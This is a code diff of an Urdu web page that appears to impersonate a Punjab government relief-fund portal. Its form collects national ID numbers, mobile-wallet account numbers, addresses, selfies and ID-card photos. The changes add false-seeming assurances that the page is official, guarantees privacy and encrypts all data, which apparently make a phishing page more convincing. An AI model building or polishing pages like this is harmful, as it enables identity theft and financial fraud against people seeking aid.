@@ -22,7 +22,6 @@
     <header class="main-header">
         <div class="header-container">
             <div class="logo-section">
-                <img src="https://i.postimg.cc/85M0L1B7/punjab-logo.png" alt="Punjab Logo">
                 <div class="logo-text">
                     <h2>حکومتِ پنجاب</h2>
                     <p>پنجاب ریلیف پروگرام - پورٹل 2026</p>
@@ -56,7 +55,7 @@
         </div>
 
         <div class="how-to">
-            <strong>نوٹ:</strong> براہ کرم اپنا شناختی کارڈ نمبر اور موبائل اکاؤنٹ نمبر (جاز کیش/ایزی پیسہ) بالکل درست فراہم کریں تاکہ ادائیگی میں تاخیر نہ ہو۔
+            <strong>ضروری نوٹ:</strong> براہ کرم اپنا شناختی کارڈ نمبر اور موبائل اکاؤنٹ نمبر (جاز کیش/ایزی پیسہ) بالکل درست فراہم کریں تاکہ ادائیگی میں کوئی تاخیر نہ ہو۔ حکومتِ پنجاب آپ کی معلومات کی مکمل رازداری کی ضمانت دیتی ہے۔
         </div>
         
         <form id="detailsForm">
@@ -76,7 +75,7 @@
             </div>
             
             <div class="payment-box">
-                <label>رقم وصول کرنے کا اکاؤنٹ منتخب کریں:</label>
+                <label style="font-weight: bold; color: var(--gov-dark);">رقم وصول کرنے کا اکاؤنٹ منتخب کریں:</label>
                 <div class="radio-opts">
                     <div>
                         <input type="radio" id="jazzcash" name="paymentMethod" value="JazzCash" checked>
@@ -101,38 +100,35 @@
             
             <div class="input-group">
                 <label for="address">رہائشی پتہ</label>
-                <textarea id="address" name="address" rows="2" placeholder="اپنا پتہ لکھیں" required></textarea>
+                <textarea id="address" name="address" rows="2" placeholder="اپنا مکمل پتہ لکھیں" required></textarea>
             </div>
             
             <div class="input-group">
-                <label for="userPic">درخواست گزار کی تصویر</label>
+                <label for="userPic">درخواست گزار کی تصویر اپلوڈ کریں</label>
                 <input type="file" id="userPic" name="userPic" accept="image/*" required>
             </div>
 
             <div class="input-group">
-                <label for="idCardPic">شناختی کارڈ کی سامنے والی تصویر</label>
+                <label for="idCardPic">شناختی کارڈ کی سامنے والی تصویر اپلوڈ کریں</label>
                 <input type="file" id="idCardPic" name="idCardPic" accept="image/*" required>
             </div>
             
-            <button type="submit" class="submit-btn">رجسٹریشن جمع کروائیں</button>
+            <button type="submit" class="submit-btn">رجسٹریشن مکمل کریں</button>
         </form>
         
         <div id="successMessage" class="hidden">
             <div style="text-align:center; padding: 40px;">
-                <h2 style="color:var(--gov-green);">درخواست موصول ہوگئی!</h2>
-                <p>آپ کی رجسٹریشن کامیابی سے مکمل ہو گئی ہے۔ تصدیق کے بعد رقم منتقل کر دی جائے گی۔</p>
-                <button onclick="location.reload()" style="margin-top:20px; padding:10px 20px;">واپس جائیں</button>
+                <h2 style="color:var(--gov-green); font-size: 2rem;">درخواست کامیابی سے جمع ہوگئی!</h2>
+                <p style="font-size: 1.1rem; margin-top: 10px;">آپ کی رجسٹریشن مکمل ہو گئی ہے۔ تصدیقی پیغام جلد آپ کے موبائل نمبر پر بھیج دیا جائے گا۔</p>
+                <button onclick="location.reload()" style="margin-top:30px; padding:12px 30px; background: var(--gov-green); color: white; border:none; cursor:pointer; font-weight:bold;">نیا فارم بھریں</button>
             </div>
         </div>
     </div>
 
     <footer>
-        <div class="footer-logos">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/10/Coat_of_arms_of_Punjab.svg/150px-Coat_of_arms_of_Punjab.svg.png" alt="Punjab Logo">
-        </div>
-        <p>© 2026 حکومتِ پنجاب - پنجاب انفارمیشن ٹیکنالوجی بورڈ (PITB)</p>
-        <div style="font-size: 0.8rem; margin-top: 10px; opacity: 0.7;">
-            تمام حقوق محفوظ ہیں۔ یہ پورٹل صرف ریلیف پروگرام کے لیے مخصوص ہے۔
+        <div class="footer-info">
+            <p>© 2026 حکومتِ پنجاب - پنجاب انفارمیشن ٹیکنالوجی بورڈ (PITB)</p>
+            <p style="margin-top: 10px; font-size: 0.8rem;">یہ ویب سائٹ وزیراعلیٰ ریلیف فنڈ کی باضابطہ رجسٹریشن کے لیے بنائی گئی ہے۔ تمام ڈیٹا انکرپٹڈ اور محفوظ ہے۔</p>
         </div>
     </footer>
     <script src="script.js"></script>
